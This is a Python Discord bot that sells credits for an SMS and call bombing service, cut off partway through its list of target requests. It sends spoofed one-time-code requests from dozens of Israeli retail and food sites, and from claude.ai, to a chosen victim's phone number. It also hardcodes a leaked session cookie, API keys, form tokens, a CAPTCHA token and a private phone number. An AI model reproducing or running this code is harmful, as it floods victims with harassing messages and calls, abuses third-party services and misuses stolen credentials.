import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import time
import random
import uuid as _uuid
import aiohttp
from pymongo import MongoClient
from motor.motor_asyncio import AsyncIOMotorClient
import logging
import re
import sys
import os
from datetime import datetime, timezone
import certifi

# ─── הגדרות ───────────────────────────────────────────────────────────────────

TOKEN = os.getenv("DISCORD_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
DB_NAME = "my_app_db"

REQUIRED_GUILD_ID = int(os.getenv("CLIENT_ID", "1474108763135938563"))
INVITE_LINK = "https://discord.gg/3CxwPGuGyq"

CHANNELS = {
    "PANEL": 1481957038241353779,
    "GIFT_PANEL": 1485104425625325709,
}

FREE_CREDITS_CHANNEL = 1485104425625325709
BOMB_AUTO_CHANNEL = 1481957038241353779
INFO_CHANNEL = 1485125569690603692

ALLOWED_ROLE_ID = 1480762750052601886
BUY_URL = "https://discord.gg/3CxwPGuGyq"

COOLDOWN_SECONDS = 20
ROUNDS_PER_CREDIT = 3
MAX_CREDITS = 100
LAUNCH_COOLDOWN = 5
DAILY_TRANSFER = 86400

RED = 0xDC143C
DARK_RED = 0x8B0000
ORANGE_RED = 0xFF4500

TOTAL_SERVICES = 88

# --- עוגיות ---
CLAUDE_COOKIE = "activitySessionId=8e5e644c-d640-4b9f-be61-59b9a138a42b; anthropic-device-id=4ed16e2b-8252-4456-8e7a-e466ede65652; _fbp=fb.1.1773186995656.51415631283246056; app-shell-mode=gate-disabled; CH-prefers-color-scheme=light; __ssid=aac9d1c5-0950-4438-b7ea-a89a1639d015; cookie_seed_done=1; intercom-device-id-lupk8zyo=f68271ce-ab05-40b7-b143-901ad283a161; user-sidebar-visible-on-load=true; user-recents-collapsed=false; user-sidebar-pinned=true; g_state={\"i_l\":0,\"i_ll\":1773414635601,\"i_b\":\"y3RrxvHpC/63IgqxQoW+FkAztdzRlQfKqrSCo5paIW4\",\"i_e\":{\"enable_itp_optimization\":0},\"i_t\":1773501035602}; __cf_bm=3VjDxw6wkQm2wlbHFDvk8MaDT_DB6R36F4R.MVnz0p4-1773447632-1.0.1.1-6q05RiFdtxB27W.Dlk8sZzMKN2_GWuJqrNh03eIFieCaneWW7KiQJxVTVTNIxcxA4EeiLytjTSnQLzFe5XvedaBVzIzDp_EoeqS.drKNHic; _cfuvid=zbw_U3cChwMfKZyPfROexrLBbuzQTKW2FW6ko.UebTU-1773447632362-0.0.1.1-604800000; __stripe_mid=eabdbe50-cd60-4100-9f89-6403dde971eb6b036c; __stripe_sid=7b2497e5-5647-4528-aa38-9272e68de8c5289f41; sessionKey=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; lastActiveOrg=2b096853-0284-4d04-8bee-d3d6eb9ec7b1; cf_clearance=CM9MGR4oytc4fDuAdMWrgtGLrwjHrZfyGjDHQmELKWs-1773447692-1.2.1.1-8qu2TBglm35vOa3Y5dwU3Ue0D7gBkTfD20EtG9u.GXPEkWyTnnSOlsalbwktHG1lj9TvVOnuD19OeZaXbAIFnPMBAT3VnNkt2Rg5J8MQ9qAXN3Wf3DwDbPI.qiNUmVZwwvjmHdyRkI.fuz248__ESMWvCdMkeASIwHP7DT5e14INWZ3.iSxdKpFmZwoKzVGj1ge2Bba07dhQbqnbXVM1J7Ov4yMposOalAOKdx7hZN4; ajs_user_id=34d05785-fcf5-4298-8314-ac95766337ff; ajs_anonymous_id=64ed414c-6982-4d71-803f-2241e4e9546a; intercom-session-lupk8zyo=QTJuM3pjOVY3bWs1Njc4T0ZBQlZ1T2V6OUx0bjREempveE5JalZsR0FNMEpZYjdXZ3BYUE83WnhxYXV4S0tZSTdORlluTUc2OE14UnVCRHhBcjlzdE42SFo1ZW1NK1hWeEtZeTA0Y0hYYzlvcTN0RlBCa2YxV3JRbGJHM1B4WFltZVNNWk1QUXhWMzBEclNvUFphUTZNNTV0dk12T2s5QzhYSGN2U0pkeWNHM2NSOEZyMUU3amxwU2N5MGc4VkRpVEFZS0JrQzF3MFUyc2pzZlJyV0lTdXlDNncvYUYzcjQ1UkRkbzdmRTA1MnhiSHliZSt0akc2NjBzdjUyV2VwVkNQZ3ptd09xRzZZOTJMMXZEUzFVNmxxb3RTNG1ZYWs1K3Y5RFBTQXhiM1k9LS1YdEp3STBsUkF2S2FWSFptb29sYzFnPT0=--94e9f81d682285fead0655379f59452a0e43ab83; routingHint=sk-ant-rh-eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJFUzI1NiIsICJraWQiOiAiN0MxcWFPRnhqdWxaUjRFQnNuNk1UeUZGNWdDV2JHbFpNVDR2RklrRFFpbyJ9.eyJzdWIiOiAiMzRkMDU3ODUtZmNmNS00Mjk4LTgzMTQtYWM5NTc2NjMzN2ZmIiwgImlhdCI6IDE3NzM0NDc2OTYsICJpc3MiOiAiY2xhdWRlLWFpLXJvdXRpbmciLCAib25ib2FyZGluZ19jb21wbGV0ZSI6IHRydWUsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAiYWdlX3ZlcmlmaWVkIjogdHJ1ZSwgImxvY2FsZSI6ICJlbi1VUyJ9.yRj_WgY7-XZbfW8XvjAb8ybkDmv2wDhrNH2WqAywFX2DVfMGZayA92Tj5WJwB3-kcV2JC3Un2eERG-bLEPQlAw; _gcl_au=1.1.357471279.1773367551.67089487.1773447650.1773447710; _dd_s=aid=631a5dba-fcfc-4e29-854f-58b2ec36a49d&rum=0&expire=1773448656835"

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

mongo_client = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
db = mongo_client[DB_NAME]
credits_col = db["users"]
cooldowns_col = db["cooldowns"]
settings_col = db["settings"]

logging.basicConfig(level=logging.WARNING)

active_attacks: dict[int, asyncio.Event] = {}
_launch_cooldowns: dict[int, float] = {}

# ─── סוכני משתמש אקראיים ───────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 GoogleWv/1.0 (WKWebView) GeminiiOS/1.2026.0570001",
    "Mozilla/5.0 (Android 14; Mobile; rv:148.0) Gecko/148.0 Firefox/148.0"
]

def random_ua():
    return random.choice(USER_AGENTS)

# ─── פונקציות עזר MongoDB ────────────────────────────────────────────────────

async def get_credits(uid: int) -> int:
    doc = await credits_col.find_one({"_id": uid})
    if not doc: return 0
    if doc.get("lifetime"): return 999999
    return doc.get("credits", 0)

async def has_lifetime(uid: int) -> bool:
    doc = await credits_col.find_one({"_id": uid})
    return bool(doc and doc.get("lifetime"))

async def get_balance_display(uid: int) -> str:
    if await has_lifetime(uid):
        return "ללא הגבלה"
    return str(await get_credits(uid))

async def add_credits(uid: int, amount: int):
    await credits_col.update_one({"_id": uid}, {"$inc": {"credits": amount}}, upsert=True)

async def remove_credits(uid: int, amount: int):
    await credits_col.update_one({"_id": uid}, {"$inc": {"credits": -amount}}, upsert=True)

async def set_lifetime(uid: int, value: bool):
    await credits_col.update_one({"_id": uid}, {"$set": {"lifetime": value}}, upsert=True)

async def deduct_credits(uid: int) -> bool:
    if await has_lifetime(uid): return True
    res = await credits_col.update_one(
        {"_id": uid, "credits": {"$gte": 1}},
        {"$inc": {"credits": -1}}
    )
    return res.modified_count == 1

async def is_on_cooldown(phone: str) -> tuple[bool, int]:
    doc = await cooldowns_col.find_one({"phone": phone})
    if not doc: return False, 0
    diff = time.time() - doc["last_sent"]
    if diff < COOLDOWN_SECONDS:
        return True, int(COOLDOWN_SECONDS - diff)
    return False, 0

async def set_cooldown(phone: str):
    await cooldowns_col.update_one({"phone": phone}, {"$set": {"last_sent": time.time()}}, upsert=True)

def is_admin(interaction: discord.Interaction) -> bool:
    return ALLOWED_ROLE_ID in [r.id for r in interaction.user.roles]

# ─── מנוע HTTP ──────────────────────────────────────────────────────────────

async def _async_req(session: aiohttp.ClientSession, method: str, url: str,
                     data=None, json_body=None, extra_headers=None, label="") -> tuple[bool, str, str]:
    headers = {
        "User-Agent": random_ua(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    if extra_headers:
        headers.update(extra_headers)

    if isinstance(data, str):
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")

    try:
        timeout = aiohttp.ClientTimeout(total=12)
        if method.upper() == "POST":
            if json_body is not None:
                headers.setdefault("Content-Type", "application/json")
                async with session.post(url, json=json_body, headers=headers, timeout=timeout, ssl=False) as resp:
                    await resp.read() 
                    ok = 200 <= resp.status < 300
                    return ok, label, "OK" if ok else f"HTTP {resp.status}"
            else:
                async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False) as resp:
                    await resp.read() 
                    ok = 200 <= resp.status < 300
                    return ok, label, "OK" if ok else f"HTTP {resp.status}"
        else:
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read() 
                ok = 200 <= resp.status < 300
                return ok, label, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, label, str(type(e).__name__)

async def _atmos(session, restaurant_id, phone, origin="https://order.atmos.rest", referer="https://order.atmos.rest/") -> tuple[bool, str, str]:
    label = f"atmos-{restaurant_id}"
    fd = aiohttp.FormData()
    fd.add_field("restaurant_id", restaurant_id)
    fd.add_field("phone", phone)
    fd.add_field("testing", "false")
    h = {
        "User-Agent": random_ua(),
        "accept": "application/json, text/plain, */*",
        "accept-language": "he-IL,he;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "origin": origin, "referer": referer,
        "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site",
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        url = f"https://api-ns.atmos.co.il/rest/{restaurant_id}/auth/sendValidationCode"
        async with session.post(url, data=fd, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read() 
            ok = 200 <= resp.status < 300
            return ok, label, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, label, str(type(e).__name__)

async def process_atmos_in_batches(session, p, atmos_ids):
    results = []
    batch_size = 5
    for i in range(0, len(atmos_ids), batch_size):
        batch = atmos_ids[i:i + batch_size]
        tasks = [_atmos(session, rid, p) for rid in batch]
        res = await asyncio.gather(*tasks, return_exceptions=True)
        results.extend(res)
        await asyncio.sleep(0.5)
    return results

async def _claude(session, phone) -> tuple[bool, str, str]:
    label = "claude"
    clean_phone = phone.lstrip('0')
    if not clean_phone.startswith('+972'):
         clean_phone = f"+972{clean_phone}"

    url = "https://claude.ai/api/auth/send_phone_code"
    headers = {
        "accept": "*/*",
        "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "origin": "https://claude.ai",
        "referer": "https://claude.ai/onboarding",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "anthropic-client-platform": "web_claude_ai",
        "anthropic-client-version": "1.0.0",
        "user-agent": random_ua()
    }
    if CLAUDE_COOKIE:
        headers["cookie"] = CLAUDE_COOKIE

    payload = {"phone_number": clean_phone}

    try:
        timeout = aiohttp.ClientTimeout(total=12)
        async with session.post(url, json=payload, headers=headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, label, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, label, str(type(e).__name__)

async def _oshioshi(session, phone) -> tuple[bool, str, str]:
    label = "oshioshi"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with session.get("https://delivery.oshioshi.co.il/he/login", timeout=timeout, ssl=False) as resp:
            text = await resp.text()
            match = re.search(r'name="_token"\s+value="([^"]+)"', text)
            if not match:
                return False, label, "חסר טוקן"
            token = match.group(1)
        
        url = "https://delivery.oshioshi.co.il/he/auth/register-send-code"
        data = f"phone={phone}&_token={token}"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://delivery.oshioshi.co.il",
            "referer": "https://delivery.oshioshi.co.il/he/",
            "User-Agent": random_ua()
        }
        async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, label, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, label, str(type(e).__name__)

# ─── הלב של הספאמר ──────────────────────────────────────────────────────────

async def fire_all_senders(phone: str) -> tuple[int, list[str]]:
    p = phone
    phone_972 = f"+972{p[1:]}" if p.startswith("0") else f"+972{p}"
    uid = str(_uuid.uuid4())
    rand_email = f"igal{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
    FORM = "application/x-www-form-urlencoded; charset=UTF-8"
    CH = '"Google Chrome";v="145", "Chromium";v="145", "Not/A)Brand";v="24"'

    def fh(origin, referer, extra=None):
        h = {"Content-Type": FORM, "x-requested-with": "XMLHttpRequest",
             "origin": origin, "referer": referer,
             "sec-ch-ua": CH, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
             "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin"}
        if extra: h.update(extra)
        return h

    def jh(origin, referer, extra=None):
        h = {"Content-Type": "application/json",
             "origin": origin, "referer": referer,
             "sec-ch-ua": CH, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
             "sec-fetch-dest": "empty", "sec-fetch-mode": "cors"}
        if extra: h.update(extra)
        return h

    connector = aiohttp.TCPConnector(limit=120, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as s:
        atmos_ids = [
            "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
            "28","29","33","35","48","51","56","57","59",
            "2008","2011","2012","2014","2041","2052","2053","2056","2059",
            "2063","2070","2073","2076","2078","2087","2088","2091",
        ]
        
        atmos_results = await process_atmos_in_batches(s, p, atmos_ids)
        
        atmos_club_tasks = [
            _atmos(s, "23", p, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/"),
            _atmos(s, "59", p, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/"),
        ]

        geteat_fd = aiohttp.FormData()
        geteat_fd.add_field("restaurant_id", "9")
        geteat_fd.add_field("phone", p)
        geteat_fd.add_field("testing", "false")
        
        tasks = [
            _async_req(s, "POST", "https://netfree.link/api/user/verify-phone/get-call",
                json_body={"agreeTou": True, "phone": phone_972},
                extra_headers=jh("https://netfree.link","https://netfree.link/welcome/",
                                 {"sec-fetch-site":"same-origin"}), label="netfree"),
            _claude(s, p),
            _oshioshi(s, p),
            _async_req(s,"POST","https://www.negev-group.co.il/customer/ajax/post/",data=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.negev-group.co.il","https://www.negev-group.co.il/",{"sec-fetch-site":"same-origin"}),label="negev-group"),
            _async_req(s,"POST","https://www.gali.co.il/customer/ajax/post/",data=f"form_key=xT4xBP6oaqFhxMVR&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.gali.co.il","https://www.gali.co.il/"),label="gali"),
            _async_req(s,"POST","https://www.aldoshoes.co.il/customer/ajax/post/",data=f"form_key=FD1Zm1GUMQXUivz6&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.aldoshoes.co.il","https://www.aldoshoes.co.il/"),label="aldoshoes"),
            _async_req(s,"POST","https://www.hoodies.co.il/customer/ajax/post/",data=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.hoodies.co.il","https://www.hoodies.co.il/"),label="hoodies"),
            _async_req(s,"POST","https://api.gomobile.co.il/api/login",data=f'{{"phone":"{p}"}}',extra_headers=fh("https://www.gomobile.co.il","https://www.gomobile.co.il/"),label="gomobile"),
            _async_req(s,"POST","https://bonitademas.co.il/apps/imapi-customer",data=f'{{"action":"login","otpBy":"sms","otpValue":"{p}"}}',extra_headers=fh("https://bonitademas.co.il","https://bonitademas.co.il/"),label="bonitademas"),
            _async_req(s,"POST","https://story.magicetl.com/public/shopify/apps/otp-login/step-one",data=f'{{"phone":"{p}"}}',extra_headers=fh("https://storyonline.co.il","https://storyonline.co.il/"),label="storyonline"),
            _async_req(s,"POST","https://www.crazyline.com/customer/ajax/post/",data=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.crazyline.com","https://www.crazyline.com/"),label="crazyline"),
            _async_req(s,"POST","https://authentication.wolt.com/v1/captcha/site_key_authenticated",data={"phone_number":f"{p}","operation":"request_number_verification"},extra_headers=fh("https://wolt.com","https://wolt.com/"),label="wolt-captcha"),
            _async_req(s, "POST", "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2", data=f'{{"phoneNumber": "{p}", "isCalling": true}}', extra_headers=fh("https://www.mishloha.co.il", "https://www.mishloha.co.il/"), label="mishloha"),
            _async_req(s,"POST","https://www.golfkids.co.il/customer/ajax/post/",data=f"form_key=XB0c9tAkTouRgHrI&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.golfkids.co.il","https://www.golfkids.co.il/"),label="golfkids"),
            _async_req(s,"POST","https://www.onot.co.il/customer/ajax/post/",data=f"form_key=xmemtkBNMoUSLrMN&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.onot.co.il","https://www.onot.co.il/"),label="onot"),
            _async_req(s,"POST","https://fox.co.il/apps/dream-card/api/proxy/otp/send",data=f'{{"phoneNumber":"{p}","uuid":"498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"}}',extra_headers=fh("https://fox.co.il","https://fox.co.il/"),label="fox"),
            _async_req(s,"POST","https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",data=f'{{"phoneNumber":"{p}","uuid":"6db5a63b-6882-414f-a090-de263dd917d7"}}',extra_headers=fh("https://www.foxhome.co.il","https://www.foxhome.co.il/"),label="foxhome"),
            _async_req(s,"POST","https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",data=f'{{"phoneNumber":"{p}","uuid":"ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}}',extra_headers=fh("https://www.laline.co.il","https://www.laline.co.il/"),label="laline"),
            _async_req(s,"POST","https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",data=f'{{"phoneNumber":"{p}","uuid":"9961459f-9f83-4aab-9cee-58b1f6793547"}}',extra_headers=fh("https://footlocker.co.il","https://footlocker.co.il/"),label="footlocker"),
            _async_req(s,"POST","https://www.golfco.co.il/customer/ajax/post/",data=f"form_key=SIiL0WFN6AtJF6lb&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.golfco.co.il","https://www.golfco.co.il/"),label="golfco"),
            _async_req(s,"POST","https://www.timberland.co.il/customer/ajax/post/",data=f"form_key=gU7iqYv5eiwuKVef&bot_validation=1&type=login&phone={p}",extra_headers=fh("https://www.timberland.co.il","https://www.timberland.co.il/"),label="timberland"),
            _async_req(s,"POST","https://www.solopizza.org.il/_a/aff_otp_auth",data=f"value={p}&type=phone&projectId=1",extra_headers=fh("https://www.solopizza.org.il","https://www.solopizza.org.il/"),label="solopizza"),
            _async_req(s,"POST","https://users-auth.hamal.co.il/auth/send-auth-code",data=f'{{"value":"{p}","type":"phone","projectId":"1"}}',extra_headers=fh("https://hamal.co.il","https://hamal.co.il/"),label="hamal"),
            _async_req(s,"POST","https://www.urbanica-wh.com/customer/ajax/post/",data=f"form_key=sucdtpszDEqdOgkv&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.urbanica-wh.com","https://www.urbanica-wh.com/"),label="urbanica"),
            _async_req(s,"POST","https://www.intima-il.co.il/customer/ajax/post/",data=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.intima-il.co.il","https://www.intima-il.co.il/"),label="intima"),
            _async_req(s,"POST","https://www.steimatzky.co.il/customer/ajax/post/",data=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.steimatzky.co.il","https://www.steimatzky.co.il/"),label="steimatzky"),
            _async_req(s,"POST","https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",data=f"value={p}&value_type=",extra_headers=fh("https://www.globes.co.il","https://www.globes.co.il/"),label="globes"),
            _async_req(s,"POST","https://www.moraz.co.il/wp-admin/admin-ajax.php",data=f"action=validate_user_by_sms&phone={p}&email=&from_reg=false",extra_headers=fh("https://www.moraz.co.il","https://www.moraz.co.il/",{"sec-fetch-site":"same-origin"}),label="moraz"),
            _async_req(s,"POST","https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send",json_body={"phoneNumber":p,"uuid":uid},extra_headers=jh("https://itaybrands.co.il","https://itaybrands.co.il/",{"sec-fetch-site":"same-origin","x-requested-with":"XMLHttpRequest"}),label="itaybrands"),
            _async_req(s,"POST","https://api.gomobile.co.il/api/login",json_body={"phone":p},extra_headers=jh("https://www.gomobile.co.il","https://www.gomobile.co.il/",{"sec-fetch-site":"same-site"}),label="gomobile"),
            _async_req(s,"POST","https://www.spicesonline.co.il/wp-admin/admin-ajax.php",data=f"action=validate_user_by_sms&phone={p}",extra_headers=fh("https://www.spicesonline.co.il","https://www.spicesonline.co.il/"),label="spicesonline"),
            _async_req(s,"POST","https://www.stepin.co.il/customer/ajax/post/",data=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",extra_headers=fh("https://www.stepin.co.il","https://www.stepin.co.il/"),label="stepin"),
            _async_req(s,"POST","https://mobile.rami-levy.co.il/api/Helpers/OTP",data=f"phone={p}&template=OTP&type=1",extra_headers={"Content-Type":"application/x-www-form-urlencoded","accept-encoding":"gzip, deflate","origin":"https://mobile.rami-levy.co.il","referer":"https://mobile.rami-levy.co.il/","x-requested-with":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"},label="rami-levy"),
            _async_req(s,"POST","https://api.zygo.co.il/v2/auth/create-verify-token",json_body={"phone":p},extra_headers={"Content-Type":"application/json","origin":"https://zygo.co.il","referer":"https://zygo.co.il/","accept-encoding":"gzip, deflate","sec-fetch-site":"same-site"},label="zygo"),
            _async_req(s,"POST","https://ros-rp.tabit.cloud/services/loyalty/customerProfile/auth/mobile",json_body={"mobile":p},extra_headers={"Content-Type":"application/json","accept-encoding":"gzip, deflate","accountguid":"0787F516-E97E-408A-A1CF-53D0C4D57C7C","cpversion":"3.3.0","env":"il","joinchannelguid":"74FE1A48-0FA0-4C8F-B962-6AE88A242023","siteid":"6203e7787694b434c7a7eb0a","origin":"https://customer-profile.tabit.cloud","referer":"https://customer-profile.tabit.cloud/","sec-fetch-site":"same-site"},label="tabit"),
            _async_req(s,"GET",f"https://ivr.business/api/Customer/getTempCodeToPhoneVarification/{p}",extra_headers={"origin":"https://ivr.business","referer":"https://ivr.business/","accept-encoding":"gzip, deflate"},label="ivr.business"),
            _async_req(s, "POST", "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer", data={"configCode": "ivr2_10_23", "uniqCustomerId": "68058a89-fedd-4409-8725-f989652d8305", "gr": "0cAFcWeA5PbEgcsunaaEtl6NGj42rsCw_j-mRZXXcpIwHiMkRv8_z5ALroAy4nrB5H0d9_3EmAT5lir9rdEUmYgJcljVuwkmXejS2XpA8D-SslaqIGDAxdoPpt8avI4LEirhzVHZS84ELsjkcSVnE9MHDQf4uGnuT99SpOJqr5vrQ8eamoK2JopgSoYOeSJ-jxvTkahhmphpEWQM6hqtF0MU80L7zXTCiBd0pizXHWf904G_emSIqIrmaU5bgE9EM6gH3Zj8hcVmI-7L-eQ0vRdQioD_TAC4WhCJ4GRwhKqNIM3VVh3OoT8I24BqoT1VPptonhRje1XR7g1gB_vRbQieoXLXkHq8oCX5PgC9AtSbHwD88F7bfyNRlt5n44OPa5UnBnIx58aJlDk5sRXqV9EHpJOVMg08S4M4FzIDbYEKOPHHrnfWujAdjNsHfkmjezSFcfk4IAAgjCTfkXlxhGZ6lKKoJzbX7p3n1NcmtJ2M9W3nU01-J3w6e4PmR3gDXTp2LvkBQPUf2V-ZeHaQZYMAZDKnkgbLDrgmUofR232uXigH8MDrKyctqUeXJdApEFZnPg4OGvSXXCNx5qmDRnjsgf_S-nFOBJhyAXqh2H-1i8d5lHD0NO-fXB9gj_bPd5g9Dy9fBG96bsYrAnpzOGDoETucSkhY9nh9ZR7eS5efKUTf_UD-Ml6sYdEmdaL-vj90IZFwHKTf51n5XJ7DpU9gSO-TlOH4_RoGFdbO4Cbyf1QgPuJe1oRVl4XCnad4EEyO1WRL5D33Rg-SLWzDMHUrjzKYVcX6TJyledkhCyaVpiG5-Jtc4P2ER1Vd9qhZoXTmyY8Qhxku8fpiur6Kgn7vJhz21gmFfytzHwQyFxMNtYKGGy9i3f_vrcVZtAn-Hl9AOLh825jWS3dGIou4zIaAoWxIyHTPF1YewbwXXLxguzD1b0OdLN-4H2aaGG5-4xj4Kpj0ObbCJSXNYrkRZ6lXS--aOoHreDg4rMN8os-_lyKHQvxvQbNAbC3u9xf73X_zpNPU6riKHRIVDnZvUMdpm_fPtnc3w6Vc5aTMJJPmP-axLkT4g0hd9j8RaCkXKMSaszT60elGULw-t-oA79BkTi2x5xuStGScG_35Kk9kP6B7mvtuDmhqQe1c5vabCuj_ueyWod8LXeEpX5wPOKjyDNVhjSS4IJt_LDLl1ecc4seD6s9yC1INKUQFIe52J37ekfrh2rLSqw1ERZ2Vl_YziFDTE4OHpAh1Y3rOI4jqXaYyRVnt4PvNBjkYuPcImXrQxB-yM6AHA_5QzZByozp2ZD39zVPzC6uATt72ZLXnoxNE6Bxa0QkOElaIuSkHv0JiL4VPzjPgE4J3cTK9zESKE7M7KO89NUToDVJ6vrT06MnY12nZJtYjtgLoba0nqVl1512nIHV12bK3MZpbOzrl2hNoEMbUM-KZsyMlnoQZHy2_n8I3YZwgTMTD2Os6YGSG4IViPy2xZ-jf70bmBaT48XgW0JDPKIGXSMZYY9SEIn4FnbvE0iageIOaRA8GI8urP5Gm345SPFFlTJHOPFYZncz8wmbFOb6Sj2lhO0PBT6rWMpmEpjpSFatJkCRxocQVrcTLZx8nrgvmoGDieH_RG--juXCrwmcAiX0hN56lKOFpoh0RUX6mQTPY1X1O7M05l7iYpy3D_l_KcxgpDg61AdYuq_oFC_xdd99bVScV-2YcxAIkx4ggpU7IuLOHtvoPn-bftPxaOSI3gepj0TbIioHZ4dvSI3-RgGHRWVmb7GRntKT7r5VqT10frTJEa9ZtIyrH2QfRBWB0SaSBZ7pjEtmK1hoBouEdimg8JyTnSfq64DtJZnStDTWEdC6dpqOXbeI3fgV6angRqH9dJxY_Mgjo1Rj7Oo_xr2UadXo3kLj_p3CLfG8ryBcZnK0OtHm-w0EzdS6ouaNdfQZ6a0BcYPlCli605PEf3C2Ef-LCCYGIQjZ4hdvkXHE5YSyroCzUUNtI9HRLWsIildw9LUHz4G4U5fLlilCQq0L2W3VS-0OBrpJU2e17wRL3802ILYquN2KRrbtQz0-IllIPPEqX52EF5lBV7L1dnguGK5Lr1417W9l9mdhnUkAuE_T9dQ7_mucqcgFu3EZCAkMWEb6cuae4SELDtLQ1ch_CFQR1oGpe8wLnsyEwboyoe-nr2nfwLnuC7sc5ugnliWgc6GLMlVQQEbrLKGD9tQS98nT-LKVUrqyQkcmFE", "phone": "0504414408", "sendCodeBy": "CALL", "step": "SendValidPhone", "token": "menualWS_ymta", "uniqCustomerId": "68058a89-fedd-4409-8725-f989652d8305"}, extra_headers={"origin": "https://www.call2all.co.il", "referer": "https://www.call2all.co.il/", "accept-encoding": "gzip, deflate"}, label="call2all.co.il"),
